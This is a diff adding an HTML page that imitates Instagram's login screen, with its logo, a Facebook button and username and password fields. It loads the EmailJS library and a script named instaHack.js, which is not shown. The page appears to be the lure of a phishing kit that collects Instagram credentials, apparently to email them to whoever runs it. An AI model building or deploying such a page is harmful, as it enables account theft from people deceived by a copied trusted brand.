@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <title>Instagram</title>
+    <!-- <link rel="stylesheet" href="/CSS/insta.css"> -->
+    <link
+      href="https://api.fontshare.com/v2/css?f[]=bevellier@400&f[]=cabinet-grotesk@400&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="./instaHack.css" />
+  </head>
+
+  <body>
+    <!-- <input pattern="[a-zA-Z]" oninvalid="setCustomValidity('Please enter on alphabets only. ')" type="text" class="form-control" name="first_name" placeholder="Firstname"> -->
+    <div class="language">
+      <select class="language">
+        <option selected lang="en" label="English">English</option>
+        slot
+        <option lang="hi">Hindi</option>
+        <option lang="hi">chines</option>
+        <option lang="hi">bhojpuri</option>
+        <option lang="hi">kashmiri</option>
+        <option lang="hi">uddu</option>
+        <option lang="hi">hindi</option>
+        <option lang="hi">Marathi</option>
+        <option lang="hi">Vansh</option>
+      </select>
+    </div>
+    <div class="body">
+      <div class="instaImg">
+        <img src="./image-removebg-preview (5).png" alt="" />
+        <h1 class="instaText">Instagram</h1>
+      </div>
+      <br />
+      <div class="submitBtn item_center">
+        <button disabled type="submit" class="submit" value="submit">
+          Continue with Facebook
+        </button>
+      </div>
+      <br />
+      <div class="container">
+        <h3 class="contact-me border">------------- or -------------</h3>
+        <!-- action="#" method="post" onclick="handleSubmit()" -->
+        <form class="form" action="#" onsubmit="handleSubmit()">
+          <div class="row">
+            <div class="input1 input">
+              <input
+                type="text"
+                class="id"
+                placeholder="Phone number, username, or email"
+              />
+            </div>
+            <!-- --------------------------------- -->
+
+            <div class="input2 input">
+              <input type="password" class="password" placeholder="Password" />
+            </div>
+            <!-- --------------------------------- -->
+ 
+            <!-- --------------------------------- -->
+            <div class="submitBtn item_center">
+              <button
+                type="submit"
+                class="submit"
+                value="submit"
+                onsubmit="handleSubmit()"
+              >
+                Login
+              </button>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="./instaHack.js"></script>
+  </body>
+</html>
